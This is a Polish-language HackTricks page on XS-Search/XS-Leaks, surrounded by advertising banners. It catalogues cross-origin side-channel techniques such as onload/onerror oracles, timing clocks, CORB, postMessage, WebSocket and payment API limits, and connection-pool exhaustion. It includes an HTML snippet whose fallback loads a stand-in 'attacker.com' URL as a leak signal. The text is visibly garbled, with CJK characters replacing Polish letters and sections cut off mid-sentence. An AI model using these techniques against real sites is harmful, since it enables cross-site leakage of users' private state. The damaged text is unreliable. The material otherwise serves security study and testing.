# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo tworzy i **automatyzowa zadania** za pomoc najbardziej zaawansowanych narzdzi spoecznociowych na wiecie.\
Otrzymaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na GitHubie.

</details>

## Podstawowe informacje

XS-Search to metoda wykorzystywana do **wydobywania informacji midzydomenowych** poprzez wykorzystanie podatnoci kana贸w bocznych.

Kluczowe skadniki zaanga偶owane w ten atak to:

* **Podatna strona internetowa**: Docelowa strona internetowa, z kt贸rej ma by wydobywana informacja.
* **Strona internetowa atakujcego**: Zoliwa strona internetowa stworzona przez atakujcego, kt贸r odwiedza ofiara, hostujca exploit.
* **Metoda wczenia**: Technika stosowana do wczenia Podatnej strony internetowej do Strony internetowej atakujcego (np. window.open, iframe, fetch, znacznik HTML z href itp.).
* **Technika wycieku**: Techniki u偶ywane do rozr贸偶niania r贸偶nic w stanie Podatnej strony internetowej na podstawie informacji zebranych za pomoc metody wczenia.
* **Stany**: Dwa potencjalne stany Podatnej strony internetowej, kt贸re atakujcy ma na celu rozr贸偶nienie.
* **Rozpoznawalne r贸偶nice**: Obserwowalne r贸偶nice, na kt贸rych atakujcy polega, aby wnioskowa o stanie Podatnej strony internetowej.

### Rozpoznawalne r贸偶nice

Kilka aspekt贸w mo偶na zbada, aby rozr贸偶ni stany Podatnej strony internetowej:

* **Kod stanu**: Rozr贸偶nianie midzy **r贸偶nymi kodami stanu odpowiedzi HTTP** midzydomenowymi, takimi jak bdy serwera, bdy klienta lub bdy uwierzytelniania.
* **U偶ycie interfejsu API**: Identyfikowanie **u偶ycia interfejs贸w API sieci Web** na stronach, ujawniajce, czy strona midzydomenowa korzysta z okrelonego interfejsu API JavaScript.
* **Przekierowania**: Wykrywanie nawigacji do innych stron, nie tylko przekierowa HTTP, ale tak偶e tych wywoanych przez JavaScript lub HTML.
* **Zawarto strony**: Obserwowanie **r贸偶nic w treci odpowiedzi HTTP** lub w podzasobach strony, takich jak **liczba osadzonych ramek** lub r贸偶nice w rozmiarze obraz贸w.
* **Nag贸wek HTTP**: Zauwa偶anie obecnoci lub mo偶liwej wartoci **konkretnego nag贸wka odpowiedzi HTTP**, w tym nag贸wk贸w takich jak X-Frame-Options, Content-Disposition i Cross-Origin-Resource-Policy.
* **Czas**: Zauwa偶anie sp贸jnych r贸偶nic czasowych midzy dwoma stanami.

### Metody wczenia

* **Elementy HTML**: HTML oferuje r贸偶ne elementy do **wczania zasob贸w midzydomenowych**, takie jak arkusze styl贸w, obrazy lub skrypty, zmuszajc przegldark do 偶dania zasobu nie-HTML. Kompilacj potencjalnych element贸w HTML w tym celu mo偶na znale藕 pod adresem [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Ramki**: Elementy takie jak **iframe**, **object** i **embed** mog bezporednio osadza zasoby HTML w stronie atakujcego. Jeli strona **nie ma ochrony przed osadzaniem**, JavaScript mo偶e uzyska dostp do obiektu okna osadzonego zasobu za pomoc waciwoci contentWindow.
* **Wyskakujce okna**: Metoda **`window.open`** otwiera zas贸b w nowej karcie lub oknie, dostarczajc uchwytu okna, z kt贸rym JavaScript mo偶e wsp贸dziaa za pomoc metod i waciwoci zgodnie z SOP. Wyskakujce okna, czsto u偶ywane w jednokrotnym logowaniu, omijaj ograniczenia osadzania i ciasteczek docelowego zasobu. Jednak nowoczesne przegldarki ograniczaj tworzenie wyskakujcych okien do okrelonych dziaa u偶ytkownika.
* **呕dania JavaScript**: JavaScript umo偶liwia bezporednie 偶dania zasob贸w docelowych za pomoc **XMLHttpRequests** lub **Fetch API**. Metody te oferuj precyzyjn kontrol nad 偶daniem, na przykad mo偶liwo ledzenia przekierowa HTTP.

### Techniki wycieku

* **Obsuga zdarze**: Klasyczna technika wycieku w XS-Leaks, gdzie obsuga zdarze takich jak **onload** i **onerror** dostarcza informacji o sukcesie lub niepowodzeniu adowania zasobu.
* **Komunikaty o bdach**: Wyjtki JavaScript lub specjalne strony bd贸w mog dostarcza informacji o wycieku zar贸wno bezporednio z komunikatu o bdzie, jak i przez r贸偶nicowanie midzy jego obecnoci a nieobecnoci.
* **Globalne limity**: Fizyczne ograniczenia przegldarki, takie jak pojemno pamici lub inne narzucone limity przegldarki, mog sygnalizowa osignicie progu, su偶c jako technika wycieku.
* **Globalny stan**: Wykrywalne interakcje z **globalnymi stanami przegldarek** (np. interfejsem Historii) mog by wykorzystane. Na przykad **liczba wpis贸w** w historii przegldarki mo偶e dawa wskaz贸wki dotyczce stron midzydomenowych.
* **API wydajnoci**: To API dostarcza **szczeg贸owe informacje o wydajnoci bie偶cej strony**, w tym czas sieciowy dla dokumentu i zaadowanych zasob贸w, umo偶liwiajc wnioskowanie o 偶danych zasobach.
* **Odczytywalne atrybuty**: Niekt贸re atrybuty HTML s **odczytywalne midzydomenowo** i mog by wykorzystane jako technika wycieku. Na przykad waciwo `window.frame.length` pozwala JavaScriptowi zlicza osadzone ramki na stronie midzydomenowej.

## Narzdzie XSinator i artyku

XSinator to automatyczne narzdzie do **sprawdzania przegldarek pod ktem kilku znanych XS-Leaks** opisanych w artykule: **[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)**

Mo偶esz **uzyska dostp do narzdzia pod adresem [https://xsinator.com/](https://xsinator
## **Techniki oparte na czasie**

Niekt贸re z poni偶szych technik wykorzystuj czas jako cz procesu wykrywania r贸偶nic w mo偶liwych stanach stron internetowych. Istnieje wiele sposob贸w mierzenia czasu w przegldarce internetowej.

**Zegary**: Interfejs API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) umo偶liwia programistom uzyskiwanie pomiar贸w czasu o wysokiej rozdzielczoci.\
Atakujcy mo偶e wykorzysta znaczn liczb interfejs贸w API do tworzenia niejawnych zegar贸w: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animacje CSS i inne.\
Wicej informacji: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Techniki obsugi zdarze

### Onload/Onerror

* **Metody wczania**: Ramki, elementy HTML
* **Wykrywalna r贸偶nica**: Kod stanu
* **Wicej informacji**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Podsumowanie**: Jeli podczas pr贸by adowania zasobu zostan wywoane zdarzenia onerror/onload, mo偶na ustali kod stanu.
* **Przykad kodu**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Przykad kodu pr贸buje **adowa obiekty skrypt贸w z JS**, ale mo偶na r贸wnie偶 u偶ywa **innych tag贸w**, takich jak obiekty, arkusze styl贸w, obrazy, d藕wiki. Ponadto, mo偶liwe jest r贸wnie偶 wstrzyknicie **bezporednio tagu** i zadeklarowanie zdarze `onload` i `onerror` wewntrz tagu (zamiast wstrzykiwania go z JS).

Istnieje r贸wnie偶 wersja ataku bez u偶ycia skryptu:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
W tym przypadku, jeli `example.com/404` nie zostanie znalezione, zostanie zaadowane `attacker.com/?error`.

### Czas adowania

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Czas (zazwyczaj spowodowany zawartoci strony, kodem stanu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Podsumowanie**: [**API performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) mo偶e by u偶ywane do mierzenia czasu wykonania 偶dania. Jednak mo偶na r贸wnie偶 u偶y innych zegar贸w, takich jak [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming), kt贸re mog identyfikowa zadania trwajce du偶ej ni偶 50 ms.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) inny przykad:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Czas adowania + Wymuszone zadanie o du偶ej intensywnoci

Ta technika jest podobna do poprzedniej, ale **atakujcy** bdzie r贸wnie偶 **wymusza** pewne dziaanie, aby zajo to **znaczc ilo czasu**, gdy **odpowied藕 jest pozytywna lub negatywna**, a nastpnie zmierzy ten czas.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Czas wyadowania/przed wyadowaniem

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Czas (zazwyczaj spowodowany zawartoci strony, kodem stanu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Podsumowanie**: [Zegar SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) mo偶e by u偶ywany do mierzenia czasu wykonania 偶dania. Mo偶na r贸wnie偶 u偶y innych zegar贸w.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Czas potrzebny na pobranie zasobu mo偶na zmierzy, wykorzystujc zdarzenia [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) i [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). Zdarzenie **`beforeunload`** jest wywoywane, gdy przegldarka ma przej do nowej strony, podczas gdy zdarzenie **`unload`** wystpuje, gdy nawigacja faktycznie si odbywa. R贸偶nica czasu midzy tymi dwoma zdarzeniami mo偶e by obliczona, aby okreli **czas, jaki przegldarka spdzia na pobieraniu zasobu**.

### Czas adowania ramki z ograniczeniami + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Czas (zazwyczaj spowodowany zawartoci strony, kodem stanu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Podsumowanie**: [API performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) mo偶e by u偶ywane do mierzenia czasu wykonania 偶dania. Mo偶na r贸wnie偶 u偶y innych zegar贸w.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Zauwa偶ono, 偶e w przypadku braku [Ochrony ramkowej](https://xsleaks.dev/docs/defenses/opt-in/xfo/), czas potrzebny na zaadowanie strony i jej podzasob贸w przez sie mo偶e by mierzony przez atakujcego. Pomiar ten jest zazwyczaj mo偶liwy, poniewa偶 obsuga zdarzenia `onload` ramki jest wywoywana dopiero po zakoczeniu adowania zasob贸w i wykonania kodu JavaScript. Aby omin zmienno wprowadzan przez wykonanie skryptu, atakujcy mo偶e u偶y atrybutu [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) wewntrz znacznika `<iframe>`. U偶ycie tego atrybutu ogranicza wiele funkcji, w szczeg贸lnoci wykonanie kodu JavaScript, uatwiajc tym samym pomiar, kt贸ry jest g贸wnie zale偶ny od wydajnoci sieciowej.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + bd + onload

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**:
* **Podsumowanie**: Jeli mo偶esz spowodowa bd strony, gdy dostpna jest poprawna zawarto, i zaadowa j poprawnie, gdy dostpna jest dowolna zawarto, mo偶esz utworzy ptl, aby wydoby wszystkie informacje bez mierzenia czasu.
* **Przykad kodu**:

Za贸偶my, 偶e mo偶esz **wstawi** **stron**, kt贸ra zawiera **tajn** zawarto **wewntrz Iframe**.

Mo偶esz sprawi, 偶e ofiara bdzie **szuka** pliku zawierajcego "_**flag**_" za pomoc **Iframe** (wykorzystujc na przykad CSRF). Wewntrz Iframe wiesz, 偶e zdarzenie _**onload**_ zostanie **zawsze wykonane co najmniej raz**. Nastpnie mo偶esz **zmieni** **URL** Iframe, zmieniajc tylko **zawarto** **hasa** wewntrz URL.

Na przykad:

1. **URL1**: www.atakujcy.com/xssearch#try1
2. **URL2**: www.atakujcy.com/xssearch#try2

Jeli pierwszy URL zosta **pomylnie zaadowany**, to po **zmianie** czci **hasa** w URL zdarzenie **onload** **nie zostanie ponownie wywoane**. Ale **jeli** strona miaa jakiego rodzaju **bd** podczas **adowania**, to zdarzenie **onload** zostanie **ponownie wywoane**.

W ten spos贸b mo偶esz **rozr贸偶ni** midzy stron **poprawnie** zaadowan a stron, kt贸ra ma **bd** podczas dostpu.

### Wykonanie JavaScriptu

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**:
* **Podsumowanie**: Jeli **strona** zwraca **wra偶liw** zawarto **lub** zawarto, kt贸r u偶ytkownik mo偶e **kontrolowa**. U偶ytkownik mo偶e ustawi **poprawny kod JS w przypadku negatywnym**, a nastpnie zaadowa ka偶d pr贸b wewntrz znacznik贸w **`<script>`**, wic w przypadkach **negatywnych** kod **atakujcego** jest **wykonywany**, a w przypadkach **pozytywnych** **nic** nie zostanie wykonane.
* **Przykad kodu**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Kod stanu i nag贸wki
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Podsumowanie**: **Cross-Origin Read Blocking (CORB)** to rodek bezpieczestwa, kt贸ry zapobiega adowaniu pewnych wra偶liwych zasob贸w midzydomenowych w celu ochrony przed atakami takimi jak **Spectre**. Jednak atakujcy mog wykorzysta jego zachowanie ochronne. Gdy odpowied藕 podlegajca **CORB** zwraca _**zabezpieczony**_ `Content-Type` z `nosniff` i kodem stanu `2xx`, **CORB** usuwa tre i nag贸wki odpowiedzi. Atakujcy obserwujcy to mog wnioskowa o poczeniu **kodu stanu** (wskazujcego na sukces lub bd) i `Content-Type` (oznaczajcego, czy jest chroniony przez **CORB**), co prowadzi do potencjalnego wycieku informacji.
* **Przykad kodu**:

Sprawd藕 link do wicej informacji na temat ataku.

### onblur

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Podsumowanie**: Wyciek wra偶liwych danych z atrybutu id lub name.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Mo偶liwe jest **zaadowanie strony** wewntrz Iframe i u偶ycie **`#warto_id`**, aby strona **skupia si na elemencie** Iframe z wskazanym id, a nastpnie, jeli zostanie wywoany sygna **`onblur`**, element ID istnieje.\
Mo偶esz przeprowadzi ten sam atak za pomoc znacznik贸w **`portal`**.

### Komunikaty postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Metody wczenia**: Ramki, Wyskakujce okna
* **Wykrywalna r贸偶nica**: U偶ycie interfejsu API
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Podsumowanie**: Zbieranie wra偶liwych informacji za pomoc postMessage lub wykorzystanie obecnoci postMessage jako orakulum do poznania stanu u偶ytkownika na stronie.
* **Przykad kodu**: `Kod nasuchujcy wszystkich komunikat贸w postMessage.`

Aplikacje czsto korzystaj z komunikat贸w [`postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) do komunikacji midzy r贸偶nymi domenami. Jednak ta metoda mo偶e niechccy ujawni **wra偶liwe informacje**, jeli parametr `targetOrigin` nie jest poprawnie okrelony, co pozwala na odbieranie wiadomoci przez dowolne okno. Ponadto, sam fakt otrzymania wiadomoci mo偶e dziaa jako **orakulum**; na przykad pewne wiadomoci mog by wysyane tylko do u偶ytkownik贸w zalogowanych. Dlatego obecno lub brak tych wiadomoci mo偶e ujawni informacje na temat stanu lub to偶samoci u偶ytkownika, takie jak to, czy s uwierzytelnieni czy nie.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo tworzy i **automatyzowa zadania** zasilane przez najbardziej zaawansowane narzdzia spoecznociowe na wiecie.\
Otrzymaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



## Techniki globalnych limit贸w

### Interfejs API WebSocket

* **Metody wczenia**: Ramki, Wyskakujce okna
* **Wykrywalna r贸偶nica**: U偶ycie interfejsu API
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Podsumowanie**: Wyciek liczby pocze WebSocket strony midzydomenowej poprzez wyczerpanie limitu pocze WebSocket.
* **Przykad kodu**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Mo偶liwe jest zidentyfikowanie, czy i ile **pocze WebSocket u偶ywa strona docelowa**. Pozwala to atakujcemu wykry stany aplikacji i wycieka informacje zwizane z liczb pocze WebSocket.

Jeli jedno **pochodzenie** u偶ywa **maksymalnej liczby obiekt贸w poczenia WebSocket**, niezale偶nie od ich stanu poczenia, utworzenie **nowych obiekt贸w spowoduje wyjtki JavaScript**. Aby przeprowadzi ten atak, strona atakujca otwiera stron docelow w wyskakujcym oknie lub Iframe, a nastpnie, po zaadowaniu strony doc
### Payment API

* **Metody wczenia**: Ramki, wyskakujce okienka
* **Wykrywalna r贸偶nica**: U偶ycie interfejsu API
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Podsumowanie**: Wykrywanie 偶dania patnoci, poniewa偶 tylko jedno mo偶e by aktywne w danym czasie.
* **Przykad kodu**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Ten XS-Leak umo偶liwia atakujcemu **wykrycie, kiedy strona z innego 藕r贸da inicjuje 偶danie patnoci**.

Poniewa偶 **tylko jedno 偶danie patnoci mo偶e by aktywne** w tym samym czasie, jeli docelowa witryna korzysta z interfejsu Payment Request API, wszelkie **dalsze pr贸by u偶ycia tego API zakocz si niepowodzeniem** i spowoduj **wyjtek JavaScript**. Atakujcy mo偶e wykorzysta to, **okresowo pr贸bujc pokaza interfejs API patnoci**. Jeli jedna pr贸ba powoduje wyjtek, oznacza to, 偶e docelowa witryna aktualnie go u偶ywa. Atakujcy mo偶e ukry te okresowe pr贸by, natychmiast zamykajc interfejs po jego utworzeniu.

### Pomiar ptli zdarze <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Metody wczenia**:
* **Wykrywalna r贸偶nica**: Czas (zwykle zwizany z zawartoci strony, kodem stanu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Podsumowanie**: Pomiar czasu wykonania kodu na stronie, wykorzystujc jednowtkow ptl zdarze JS.
* **Przykad kodu**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript dziaa na zasadzie jednowtkowej ptli zdarze [single-threaded event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), co oznacza, 偶e **mo偶e wykonywa tylko jedno zadanie na raz**. Ta cecha mo偶e by wykorzystana do **pomiaru czasu wykonania kodu z innego 藕r贸da**. Atakujcy mo偶e mierzy czas wykonania wasnego kodu w ptli zdarze, cigle wysyajc zdarzenia o staych waciwociach. Te zdarzenia zostan przetworzone, gdy pulapka zdarze bdzie pusta. Jeli inne 藕r贸da r贸wnie偶 wysyaj zdarzenia do tej samej pulapki, **atakujcy mo偶e wnioskowa o czasie potrzebnym na wykonanie tych zewntrznych zdarze, obserwujc op贸藕nienia w wykonywaniu wasnych zada**. Ta metoda monitorowania ptli zdarze w celu wykrywania op贸藕nie mo偶e ujawni czas wykonania kodu z r贸偶nych 藕r贸de, potencjalnie ujawniajc wra偶liwe informacje.

{% hint style="warning" %}
Podczas pomiaru czasu wykonania mo偶na **wyeliminowa** **czynniki sieciowe**, aby uzyska **bardziej precyzyjne pomiary**. Na przykad, poprzez wczytanie zasob贸w u偶ywanych przez stron przed jej zaadowaniem.
{% endhint %}

### Zajta ptla zdarze <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Metody wczenia**:
* **Wykrywalna r贸偶nica**: Czas (zwykle zwizany z zawartoci strony, kodem stanu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Podsumowanie**: Jedna z metod pomiaru czasu wykonania operacji na stronie polega na celowym zablokowaniu ptli zdarze wtku, a nastpnie pomiarze **czasu, jaki zajmuje ptli zdarze, aby ponownie sta si dostpn**. Poprzez wstawienie operacji blokujcej (takiej jak dugie obliczenia lub synchroniczne wywoanie API) do ptli zdarze i monitorowanie czasu, jaki upywa przed rozpoczciem wykonania kolejnego kodu, mo偶na wnioskowa o czasie trwania zada wykonywanych w ptli zdarze podczas okresu blokowania. Ta technika wykorzystuje jednowtkow natur ptli zdarze JavaScript, w kt贸rej zadania s wykonywane sekwencyjnie, i mo偶e dostarcza informacji na temat wydajnoci lub zachowania innych operacji, kt贸re korzystaj z tego samego wtku.
* **Przykad kodu**:

Znaczc zalet techniki pomiaru czasu wykonania poprzez blokowanie ptli zdarze jest jej potencja do obejcia **Izolacji witryny**. **Izolacja witryny** to funkcja zabezpieczajca, kt贸ra oddziela r贸偶ne witryny od siebie, aby zapobiec bezporedniemu dostpowi zoliwych witryn do wra偶liwych danych innych witryn. Jednak poprzez wpywanie na czas wykonania innego 藕r贸da poprzez wsp贸ln ptl zdarze, atakujcy mo偶e porednio wycign informacje na temat dziaa tego 藕r贸da. Ta metoda nie polega na bezporednim dostpie do danych innego 藕r贸da, ale obserwuje wpyw dziaa tego 藕r贸da na wsp贸ln ptl zdarze, unikajc tym samym barier ochronnych ustanowionych przez **Izolacj witryny**.

{% hint style="warning" %}
Podczas pomiaru czasu wykonania mo偶na **wyeliminowa** **czynniki sieciowe**, aby uzyska **bardziej precyzyjne pomiary**. Na przykad, poprzez wczytanie zasob贸w u偶ywanych przez stron przed jej zaadowaniem.
{% endhint %}

### Pula pocze

* **Metody wczenia**: 呕dania JavaScript
* **Wykrywalna r贸偶nica**: Czas (zwykle zwizany z zawartoci strony, kodem stanu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Podsumowanie**: Atakujcy mo偶e zablokowa wszystkie gniazda opr贸cz jednego, zaadowa docelow witryn i jednoczenie zaadowa inn stron, czas do rozpoczcia adowania ostatniej strony to czas, jaki zajo zaadowanie strony docelowej.
* **Przykad kodu**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Przegldarki wykorzystuj gniazda do komunikacji z serwerem, ale ze wzgldu na ograniczone zasoby systemu operacyjnego i sprztu, **przegldarki s zmuszone narzuci limit** na liczb r贸wnoczesnych gniazd. Atakujcy mo偶e wykorzysta to ograniczenie, wykonujc nastpujce kroki:

1. Okrel limit gniazd przegldarki, na przykad 256 globalnych gniazd.
2. Zajmij 255 gniazd na du偶szy czas, inicjujc 255 偶da do r贸偶nych host贸w, kt贸re maj na celu utrzymanie otwartych pocze bez ich zakoczenia.
3. Wykorzystaj 256. gniazdo do wysania 偶dania do strony docelowej.
4. Spr贸buj wysa 257. 偶danie do innego hosta. Poniewa偶 wszystkie gniazda s w u偶yciu (zgodnie z krokami 2 i 3), to 偶danie zostanie umieszczone w kolejce, a偶 gniazdo stanie si dostpne. Op贸藕nienie przed kontynuacj tego 偶dania dostarcza atakujcemu informacje o czasie aktywnoci sieciowej zwizanym z 256. gniazdem (gniazdem strony docelowej). Wnioskowanie to jest mo偶liwe,
## Techniki API wydajnoci

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) oferuje wgld w metryki wydajnoci aplikacji internetowych, wzbogacone przez [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). Resource Timing API umo偶liwia monitorowanie szczeg贸owych czas贸w 偶da sieciowych, takich jak czas trwania 偶da. Warto zauwa偶y, 偶e gdy serwery zawieraj nag贸wek `Timing-Allow-Origin: *` w odpowiedziach, dostpne staj si dodatkowe dane, takie jak rozmiar transferu i czas wyszukiwania domeny.

Te bogate dane mo偶na uzyska za pomoc metod takich jak [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) lub [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), zapewniajc wszechstronny widok informacji zwizanych z wydajnoci. Dodatkowo, API uatwia pomiar czas贸w wykonania poprzez obliczanie r贸偶nicy midzy znacznikami czasowymi uzyskanymi z [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Warto jednak zauwa偶y, 偶e dla niekt贸rych operacji w przegldarkach, takich jak Chrome, precyzja `performance.now()` mo偶e by ograniczona do milisekund, co mo偶e wpywa na dokadno pomiar贸w czasowych.

Poza pomiarami czasowymi, API Performance mo偶na wykorzysta do uzyskiwania informacji zwizanych z bezpieczestwem. Na przykad, obecno lub brak stron w obiekcie `performance` w Chrome mo偶e wskazywa na zastosowanie `X-Frame-Options`. Konkretnie, jeli strona jest blokowana przed renderowaniem w ramce ze wzgldu na `X-Frame-Options`, nie zostanie zarejestrowana w obiekcie `performance`, co dostarcza subtelnych wskaz贸wek dotyczcych polityk ramkowania strony.

### Wyciek bd贸w

* **Metody wczenia**: Ramki, elementy HTML
* **Wykrywalna r贸偶nica**: Kod stanu
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** 呕danie, kt贸re koczy si bdem, nie tworzy wpisu dotyczcego czasu zasobu.
* **Przykad kodu**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

